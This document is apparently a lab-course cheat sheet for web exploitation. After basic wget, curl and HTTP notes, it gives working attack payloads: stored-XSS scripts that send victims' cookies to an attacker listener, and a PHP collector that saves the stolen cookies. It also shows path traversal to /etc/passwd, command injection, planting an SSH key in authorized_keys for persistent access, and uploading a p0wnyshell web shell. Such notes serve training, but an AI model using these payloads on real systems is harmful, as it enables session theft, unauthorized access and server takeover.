p0wnyshell download

#HTTP reponse codes
10X == Informational
2XX == Success
30X == Redirection
4XX == Client Error
5XX == Server Error

#HTTP fields
User-Agent
Referer
Cookie
Date
Server
Set-Cookie

#WGET
wget -r -l2 -P /tmp ftp://ftpserver/
wget --save-cookies cookies.txt --keep-session-cookies --post-data 'user=1&password=2' http://website
wget --load-cookies cookies.txt -p http://....com/interesting/article.php

#proxychains with firefox
preferences-->connection settings-->sockshost localhost 9050
-or-
addons--> foxyproxy--> (icon in right corner) settings--> add--> (type)socks5--> (proxy ip) localhost --> (port) 9050

#CURL
curl -o stuff.html http://website/stuff.html
curl 'www..com' -H 'Cookie: name=123; settings=1,2,3,4,5,6,7' --data 'name=Stan' | base64 -d > item.png

#decode base65 in CLI
echo asdfDEF== | base64 -d

#Enumeration
(in the url) /robots.txt	#tells you what my be there
nmap --script=http-enum 10.50.x.x

#Nikto
nikto --host=http://10.50.20.170

#Stored XSS
<img src="http://10.50.XX.XX" onerror="window.open(&quot;http://10.50.CC.CC:8000/ram.png&quot;,&quot;xss&quot;,'height=500,width=500');">

#js cookie stealer to send to nc listener
<script>document.location="http://x.x.x.x:8000? username="+document.cookie;</script>

#js posted to the stored xss vulnerable site
<script>document.location="http://10.50.20.170/uploads/cookiestealer.php?username="+document.cookie;</script>

#php script on a webserver that will accept and store the stolen cookie. Must create cookiefile.txt first
<?php
$cookie = $_GET["username"];
$steal = fopen("/var/www/html/uploads/cookiefile.txt", "a+");
fwrite($steal,$cookie . "\n");
fclose($steal);
?>

#id if website is vulnerable to xss
<script>alert('XSS')</script>

#Server-side injection
view_image.php?file=../../etc/passwd
#from url ..%2f..%2f..%2f	(../../../)

hey ; whoami
try || -or- &&

#Command Injection
system("ping -c 1 ".$_GET["ip"]);
; cat /etc/passwd

#Generating Keys and obtaining the private key to login as that user 		without username and password
ssh-keygen
cd .ssh
cat id_rsa.pub	
#copy paste output of above to webserver
localhost ; mkdir /var/www/.ssh
localhost ; ls -lisa /var/www/.ssh	#verify creation
localhost ; echo 'paste-key-here' > /var/www/.ssh/authorized_keys
ssh www-data@x.x.x.x 

#Malicious File Upload (download p0wnyshell)
upload pony.php to site
nav via url to where the file is saved on the site (i.e /uploads/)






















